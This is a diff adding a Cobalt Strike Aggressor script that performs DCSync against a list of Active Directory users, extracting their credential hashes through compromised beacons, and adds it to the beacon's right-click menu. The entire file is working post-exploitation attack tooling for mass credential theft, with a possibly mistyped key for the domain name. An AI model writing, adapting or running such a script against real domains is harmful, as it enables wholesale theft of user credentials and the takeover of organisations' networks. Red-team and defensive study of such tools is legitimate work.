@@ -1,0 +1,43 @@
+# BSD 3-Clause License
+# 
+# Copyright (c) 2017, Jeff Dimmock
+# All rights reserved.
+# 
+# Author: Bluescreenofjeff (https://github.com/bluscreenofjeff/AggressorScripts/blob/master/mass-dcsync.cna)
+# 
+# Description: DCSync a list of user accounts from the specified domain. The list of the accounts can be saved as shortname per line.
+#
+# Updated by bigb0ss
+
+sub mass-dcsync {
+
+    @bids = $1;
+
+    $dialog = dialog("Mass DCSync", %(fqdn => "example.local", domain => "example", userlist => "/path/to/userlist"), lambda({
+        $handle = openf($3['userlist']);
+        @userlistdata = readAll($handle);
+        closef($handle);
+        foreach $bid (@bids){
+            foreach $user (@userlistdata){
+                bdcsync($bid, $3['$fqdn'], $3['domain'] . $+ . '\\' . $+ . $user);
+            };
+        };
+    }));
+
+    dialog_description($dialog, "[*] Mass DCSync against list of users");
+
+    drow_text($dialog, "fqdn", "Domain FQDN:");
+    drow_text($dialog, "domain", "Domain Shortname:");
+    drow_text($dialog, "userlist", "List of Users:");
+
+    dbutton_action($dialog, "OK");
+
+    dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+    item "Mass-DCSync" {
+        mass-dcsync($1);
+    }
+}
